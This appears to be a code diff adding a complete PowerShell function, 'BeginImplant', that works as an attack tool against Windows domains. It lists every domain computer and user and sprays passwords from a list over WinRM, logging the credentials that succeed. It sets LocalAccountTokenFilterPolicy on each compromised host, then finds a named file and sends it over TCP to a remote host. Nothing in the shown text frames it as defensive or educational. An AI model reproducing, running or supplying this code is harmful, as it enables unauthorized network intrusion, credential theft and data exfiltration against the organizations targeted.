@@ -1,14 +1,104 @@
 function BeginImplant {
-    param (
-        [Parameter(Mandatory=$true)]
-        [string]$PassList,
-
-        [Parameter(Mandatory=$true)]
-        [string]$FileName,
-
-        [Parameter(Mandatory=$true)]
-        [string]$Target,
-
-        [Parameter(Mandatory=$true)]
+    param(
+        [Parameter(Mandatory=$true)] [string]$PassList,
+        [Parameter(Mandatory=$true)] [string]$FileName,
+        [Parameter(Mandatory=$true)] [string]$Target,
         [string]$LogFile
     )
+
+    # Parse password list
+    $Passwords = Get-Content $PassList
+
+    # Get all computers in the domain
+    try {
+        $Computers = Get-ADComputer -Filter * | Select-Object -ExpandProperty Name
+    } catch {
+        Write-Error "Could not retrieve domain computers. Are you in a domain environment?"
+        return
+    }
+
+    # Get all domain users
+    try {
+        $Users = Get-ADUser -Filter * | Select-Object -ExpandProperty SamAccountName
+    } catch {
+        Write-Error "Could not retrieve domain users."
+        return
+    }
+
+    # Setup logging
+    function Log-Success {
+        param([string]$Message)
+        if ($LogFile) {
+            Add-Content -Path $LogFile -Value $Message
+        } else {
+            Write-Output $Message
+        }
+    }
+
+    $CredentialCache = @{}
+
+    foreach ($Computer in $Computers) {
+        Write-Host "[*] Attacking $Computer"
+
+        foreach ($User in $Users) {
+            foreach ($Password in $Passwords) {
+                # Skip if user is known to be locked
+                if ($CredentialCache[$User] -eq "locked") {
+                    continue
+                }
+
+                $SecurePassword = ConvertTo-SecureString $Password -AsPlainText -Force
+                $Credential = New-Object System.Management.Automation.PSCredential("$User", $SecurePassword)
+
+                # Try WinRM connection
+                try {
+                    $Session = New-PSSession -ComputerName $Computer -Credential $Credential -ErrorAction Stop
+                    Write-Host "[+] SUCCESS: $User:$Password on $Computer"
+                    Log-Success "$User:$Password on $Computer"
+
+                    # Set registry key
+                    Invoke-Command -Session $Session -ScriptBlock {
+                        New-Item -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -ErrorAction SilentlyContinue
+                        Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name "LocalAccountTokenFilterPolicy" -Value 1 -Force
+                    }
+
+                    # Search for the file
+                    $Found = Invoke-Command -Session $Session -ScriptBlock {
+                        param($FileName)
+                        Get-ChildItem -Path C:\ -Filter $FileName -Recurse -ErrorAction SilentlyContinue | Select-Object -First 1
+                    } -ArgumentList $FileName
+
+                    if ($Found) {
+                        Write-Host "[!] File found: $($Found.FullName)"
+                        # Read file bytes and send to TCP server
+                        $FileBytes = Invoke-Command -Session $Session -ScriptBlock {
+                            param($Path)
+                            [System.IO.File]::ReadAllBytes($Path)
+                        } -ArgumentList $Found.FullName
+
+                        $TargetSplit = $Target.Split(":")
+                        $TCPClient = New-Object System.Net.Sockets.TcpClient($TargetSplit[0], [int]$TargetSplit[1])
+                        $Stream = $TCPClient.GetStream()
+                        $Stream.Write($FileBytes, 0, $FileBytes.Length)
+                        $Stream.Close()
+                        $TCPClient.Close()
+
+                        Remove-PSSession $Session
+                        return # Done!
+                    }
+
+                    Remove-PSSession $Session
+
+                } catch {
+                    if ($_.Exception -match "locked out") {
+                        Write-Host "[-] Account locked: $User"
+                        $CredentialCache[$User] = "locked"
+                    }
+                    continue
+                }
+            }
+        }
+    }
+
+    Write-Host "[*] Finished, target file not found."
+}
